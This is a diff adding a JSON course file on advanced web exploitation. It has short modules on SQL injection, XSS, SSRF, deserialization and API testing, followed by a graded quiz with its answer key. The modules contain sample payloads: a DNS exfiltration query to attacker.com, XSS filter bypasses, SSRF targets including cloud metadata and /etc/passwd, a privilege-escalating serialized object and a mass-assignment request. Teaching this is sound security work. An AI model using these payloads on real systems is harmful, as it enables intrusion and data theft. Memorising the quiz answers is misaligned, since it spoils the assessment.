@@ -1,0 +1,29 @@
+{
+  "id": 7,
+  "title": "Advanced Web Exploitation",
+  "duration": "6 hours",
+  "modules": [
+    {"id": 1, "title": "Advanced SQL Injection", "duration": "50 min", "content": "## Advanced SQLi Techniques\n\n### Second-Order SQLi\nPayload stored and executed later.\n\n### Out-of-Band SQLi\nData exfiltration via DNS/HTTP.\n\n```sql\n-- DNS exfiltration\nSELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.com\\\\a'));\n```\n\n### WAF Bypass\n- Case variation: `SeLeCt`\n- Comments: `/**/`\n- Encoding: URL, hex\n- Alternative syntax"},
+    {"id": 2, "title": "Advanced XSS", "duration": "50 min", "content": "## Advanced XSS Techniques\n\n### Filter Bypass\n```javascript\n<img src=x onerror=alert(1)>\n<svg/onload=alert(1)>\n<body onload=alert(1)>\n```\n\n### CSP Bypass\n- JSONP endpoints\n- Angular template injection\n- Base tag injection\n\n### XSS to RCE\n- Service worker hijacking\n- Browser exploitation"},
+    {"id": 3, "title": "Server-Side Request Forgery", "duration": "45 min", "content": "## SSRF Attacks\n\nForce server to make requests to unintended locations.\n\n### Attack Vectors\n```\nhttp://localhost/admin\nhttp://169.254.169.254/metadata\nfile:///etc/passwd\n```\n\n### Bypass Techniques\n- URL encoding\n- DNS rebinding\n- IPv6 addresses\n- Redirects"},
+    {"id": 4, "title": "Insecure Deserialization", "duration": "45 min", "content": "## Deserialization Attacks\n\nManipulate serialized objects for code execution.\n\n### PHP Example\n```php\nO:4:\"User\":2:{s:4:\"name\";s:5:\"admin\";s:5:\"admin\";b:1;}\n```\n\n### Java Gadget Chains\n- ysoserial tool\n- Commons Collections\n\n### Prevention\n- Avoid deserializing untrusted data\n- Integrity checks\n- Type whitelisting"},
+    {"id": 5, "title": "API Security Testing", "duration": "50 min", "content": "## API Vulnerabilities\n\n### Common Issues\n- Broken authentication\n- Excessive data exposure\n- Lack of rate limiting\n- Mass assignment\n\n### Testing Tools\n```bash\n# Postman\n# Burp Suite\n# OWASP ZAP\n\ncurl -X POST http://api/users \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"admin\": true}'\n```"}
+  ],
+  "assessment": {
+    "passing_score": 80,
+    "max_attempts": 3,
+    "retry_delay_hours": 24,
+    "questions": [
+      {"id": 1, "question": "What is second-order SQL injection?", "options": ["Injection via cookies", "Stored payload executed later", "Double injection", "Encrypted injection"], "correct": 1},
+      {"id": 2, "question": "What does SSRF stand for?", "options": ["Server-Side Request Forgery", "Secure Socket Request Format", "System Security Response Function", "Server Security Risk Factor"], "correct": 0},
+      {"id": 3, "question": "Which IP is commonly targeted in SSRF for cloud metadata?", "options": ["127.0.0.1", "192.168.1.1", "169.254.169.254", "10.0.0.1"], "correct": 2},
+      {"id": 4, "question": "What tool generates Java deserialization payloads?", "options": ["SQLMap", "ysoserial", "Hashcat", "Nikto"], "correct": 1},
+      {"id": 5, "question": "Which technique bypasses WAFs?", "options": ["Stronger passwords", "Case variation", "SSL/TLS", "VPN"], "correct": 1},
+      {"id": 6, "question": "What is CSP?", "options": ["Content Security Policy", "Cross-Site Protection", "Cookie Security Protocol", "Client Server Protocol"], "correct": 0},
+      {"id": 7, "question": "Which is an API vulnerability?", "options": ["XSS", "Mass assignment", "Buffer overflow", "Format string"], "correct": 1},
+      {"id": 8, "question": "What enables XSS filter bypass?", "options": ["Event handlers", "HTTPS", "Cookies", "Sessions"], "correct": 0},
+      {"id": 9, "question": "What is out-of-band SQLi?", "options": ["Offline attack", "Data via DNS/HTTP", "Physical access", "Social engineering"], "correct": 1},
+      {"id": 10, "question": "How to prevent deserialization attacks?", "options": ["Input validation", "Avoid untrusted data", "Use HTTPS", "Strong passwords"], "correct": 1}
+    ]
+  }
+}
